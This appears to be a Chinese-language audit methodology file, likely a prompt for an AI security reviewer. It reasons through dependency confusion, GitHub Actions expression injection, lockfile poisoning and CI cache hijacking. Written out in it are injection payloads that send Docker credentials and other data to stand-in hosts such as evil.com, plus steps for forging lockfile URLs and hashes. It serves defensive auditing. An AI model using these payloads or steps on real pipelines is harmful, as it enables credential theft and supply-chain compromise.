---
description: 供应链假设验证 - CI 模拟法庭与逻辑沙盒对撞
tags: [supply-chain, hypothesis-tester, ci-injection, dependency-confusion, logic-proof]
---

# 供应链假设验证 (Hypothesis Tester): 流水线图灵脑内演算

> 不需要去污染公网 npm 或者真正向别人提交一封带毒的 PR，
> 我们要在头脑里或者极小规模的安全靶场推演它的崩坏。
> 推演不是猜测，是逻辑证明。

## 验证方法论：三段式逻辑推演

每个假设必须经得住这三问：
1. **前提条件是否成立？**（攻击者能否控制 X？）
2. **传递机制是否畅通？**（X 能否影响 Y？）
3. **影响结果是否达成？**（Y 是否导致 Z？）

如果三问都能给出"是"，则假设被证明成立。

---

## 假设一：Dependency Confusion 可利用性证明

### 前提条件验证

**问题**：攻击者能否控制目标依赖的公网版本？

**推演步骤**：
1. 提取项目依赖清单中的包名列表
2. 对每个内部包名，查询公网注册表：
   ```bash
   # npm
   curl -s https://registry.npmjs.org/<pkg-name> | jq '.name'
   # PyPI
   curl -s https://pypi.org/pypi/<pkg-name>/json | jq '.info.name'
   # crates.io
   curl -s https://crates.io/api/v1/crates/<pkg-name> | jq '.crate.name'
   ```
3. 如果返回 404 → 包名未被占用，攻击者可抢注
4. 如果返回存在 → 检查版本号。内部版本范围是否允许更高版本？

**逻辑证明**：
```
前提 P1: 包名 "internal-lib" 在 npmjs.org 上返回 404（未注册）
前提 P2: 项目 package.json 中 "internal-lib": "^1.0.0"
前提 P3: npm 的语义化版本解析规则中，^1.0.0 允许 1.x.x，但不允许 2.0.0
前提 P4: 攻击者在 npmjs.org 注册 "internal-lib@99.0.0"

推导：
  如果项目执行 npm install（不使用 lockfile 或 lockfile 被更新）
  则 npm 会解析到 99.0.0（因为 99.0.0 > 1.x.x，且不在同一 major，但 npm 实际上会取满足 range 的最高版本）
  等等，这里有个细节：^1.0.0 不会匹配 99.0.0，因为 major 版本不同
  但如果范围是 >=1.0.0 或 * → 会匹配 99.0.0
  
  修正推演：
  如果项目使用 "internal-lib": ">=1.0.0" 或 "internal-lib": "*"
  则 npm install 一定会选择 99.0.0
  
  如果项目使用 "internal-lib": "^1.0.0" 且有 lockfile 并使用 npm ci
  则 lockfile 锁定版本，Dependency Confusion 不成立（除非 lockfile 被投毒）
```

### 完整攻击链闭合证明

```
攻击者控制点: npmjs.org 上的包注册
传递机制: npm 的版本解析算法 + 项目的版本范围声明
影响结果: 恶意代码进入 node_modules 并在 install 时执行

前提条件清单（全部成立时攻击可行）：
  □ 包名在公网可被注册（或已被攻击者控制）
  □ 项目的版本范围允许选择公网更高版本
  □ 构建流程使用 npm install（而非 npm ci）或 lockfile 可被更新
  □ 包包含生命周期脚本（postinstall）或项目会引用包中的代码
  □ 构建/开发环境有权访问敏感资源（网络、secrets、文件系统）
```

---

## 假设二：CI/CD 表达式注入可利用性证明

### 前提条件验证

**问题**：攻击者能否通过 GitHub Issue / PR 标题注入 shell 命令？

**推演步骤**：
1. 找到 workflow 中所有使用 `${{ github.event.* }}` 的地方
2. 判断这些表达式对应的值是否来自用户可控输入
3. 检查这些表达式是否被用在 `run:` 命令中

**逻辑证明**（以 issue title 注入为例）：
```yaml
# 目标 workflow 片段
- name: Run tests
  run: npm test --grep="${{ github.event.issue.title }}"
```

```
前提 P1: github.event.issue.title 来自 Issue 创建者，任意用户可创建 Issue
前提 P2: GitHub Actions 的表达式引擎在 shell 执行前进行模板替换
前提 P3: 模板替换后的字符串直接传递给 bash，不经过额外的转义
前提 P4: bash 的引号闭合规则允许通过 " 截断字符串并引入新命令

攻击者输入: foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar

模板替换后:
  npm test --grep="foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar"

bash 解析:
  命令1: npm test --grep="foo"
  命令2: curl -d @/home/runner/.docker/config.json https://evil.com
  命令3: echo "bar"

结果: 命令2 成功执行，docker config 被外泄
结论: 假设成立，100% 可复现
```

### 变体推演：不同上下文的注入效果

| 表达式位置 | 注入 payload | 预期效果 |
|-----------|-------------|---------|
| `run: echo "${{ github.event.issue.title }}"` | `$(curl evil.com)` | 命令替换执行 |
| `run: npm test --grep="${{ github.event.issue.title }}"` | `foo"; env; echo "bar` | 环境变量泄露 |
| `run: git checkout ${{ github.event.pull_request.head.ref }}` | `main; curl evil.com; #` | 命令截断 + 执行 |
| `if: contains(github.event.comment.body, '/test')` | `/test' && curl evil.com || true '` | 逻辑表达式注入 |

---

## 假设三：Lockfile Poisoning 可利用性证明

### 前提条件验证

**问题**：攻击者能否在 lockfile 中夹带恶意 resolved URL 而不被发现？

**推演步骤**：
1. 统计项目 lockfile 的平均 PR diff 行数
2. 检查项目是否有自动化 lockfile 更新工具（Dependabot、Renovate）
3. 检查 lockfile 审查流程：是否有专门的 lockfile reviewer？

**逻辑证明**：
```
前提 P1: package-lock.json 通常有 3000-10000 行
前提 P2: 一个依赖更新可能引发 500-2000 行 diff（传递依赖级联更新）
前提 P3: 人类审查者无法在合理时间内逐行审查 2000 行 lockfile diff
前提 P4: GitHub 的 diff UI 对 JSON 文件的展示不友好，深层嵌套变更难以发现

攻击者操作:
  1. 提交一个"合法"的依赖升级 PR
  2. 在 package.json 中修改一个次要依赖的版本
  3. 运行 npm install，生成新的 lockfile
  4. 在 lockfile 中手动修改一个深层依赖的 resolved URL 和 integrity hash
  5. 将修改后的 lockfile 提交到 PR 中

审查者视角:
  - 看到 "升级 lodash 4.17.20 → 4.17.21"
  - 看到 lockfile 有 1500 行变更
  - 认为是正常的级联更新
  - Approve

结果:
  - 一个深层依赖的 resolved URL 被指向 attacker.com
  - npm ci 时会从 attacker.com 下载该依赖
  - 攻击成功

结论: 假设成立
```

### 完整性校验绕过推演

```
前提 P1: npm ci 会校验 integrity hash
前提 P2: 攻击者在 lockfile 中同时修改了 resolved URL 和 integrity hash
前提 P3: npm ci 从 attacker.com 下载包，计算 hash，与 lockfile 中的 hash 匹配
前提 P4: 因为 hash 匹配，npm ci 不会报错

关键漏洞: npm ci 只校验"下载的内容是否与 hash 匹配"，不校验"hash 是否与官方版本匹配"
攻击者可以同时控制文件内容和 hash，完美绕过校验

结论: integrity hash 只能防传输篡改，不能防 lockfile 投毒
```

---

## 假设四：Build Cache Hijacking 可利用性证明

### 前提条件验证

**问题**：攻击者能否污染共享缓存并影响后续构建？

**推演步骤**：
1. 检查 CI 配置中的缓存 key 生成逻辑
2. 检查缓存的读写权限（是否跨 workflow / 跨 runner）
3. 检查缓存恢复后的完整性校验

**逻辑证明**：
```yaml
# 目标 CI 配置
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
```

```
前提 P1: cache key 包含 package-lock.json 的 hash
前提 P2: 攻击者可以通过 PR 修改 package-lock.json
前提 P3: GitHub Actions cache 是仓库级别共享的，跨所有 workflow 和 runner
前提 P4: cache restore 后没有完整性校验

攻击链:
  1. 攻击者提交 PR，修改 package-lock.json（即使是微小的空白变更）
  2. CI 触发，cache miss（因为 key 变了）
  3. CI 执行 npm install，生成新的 node_modules
  4. 攻击者在 PR 的 workflow 中通过命令注入获取 runner 执行权
  5. 攻击者修改 ~/.npm 缓存中的某个包内容（植入后门）
  6. CI 完成，缓存被保存（包含被篡改的内容）
  7. 后续的正常 workflow 恢复这个缓存
  8. 正常构建使用了被篡改的缓存 → 后门进入产物

结论: 假设成立
```

---

## 专家推演工具箱

### 脑内沙盒环境

不需要真实的 CI 环境，你可以用以下方法进行逻辑推演：

1. **YAML 模板渲染推演**：
   ```python
   # 模拟 GitHub Actions 的表达式替换
   template = 'npm test --grep="${{ github.event.issue.title }}"'
   payload = 'foo"; curl evil.com; echo "bar'
   rendered = template.replace('${{ github.event.issue.title }}', payload)
   print(rendered)
   # 输出: npm test --grep="foo"; curl evil.com; echo "bar"
   ```

2. **Bash 语法树推演**：
   ```bash
   # 将渲染后的命令交给 bash 解析，观察命令边界
   echo 'npm test --grep="foo"; curl evil.com; echo "bar"' | bash -n
   # 或使用 bashlex 解析语法树
   ```

3. **版本解析推演**：
   ```bash
   # 模拟 npm 的版本解析
   npm view <pkg-name> versions --json
   # 检查哪些版本满足项目的版本范围
   ```

### 最小可行 PoC 原则

每个假设验证后，构造最小 PoC：
- **无害 payload**：使用 `echo "poc"` 或 `curl https://httpbin.org/get` 代替恶意操作
- **本地模拟**：用 `act` 工具本地运行 GitHub Actions，或手写 bash 脚本模拟 CI 环境
- **隔离验证**：在 Docker 容器中验证，确保不影响真实系统

## 输出要求

对每个假设，输出：

1. **三段式逻辑证明**：前提条件 → 传递机制 → 影响结果，每步标注"成立/不成立/需验证"
2. **最小 PoC 设计**：用无害 payload 证明漏洞存在
3. **反证思考**：在什么条件下这个假设不成立？（如使用 npm ci + lockfile 严格审查）
4. **OSV 协同分析**：如果 OSV 报告了相关 CVE，分析该 CVE 是否降低了某个前提条件的门槛
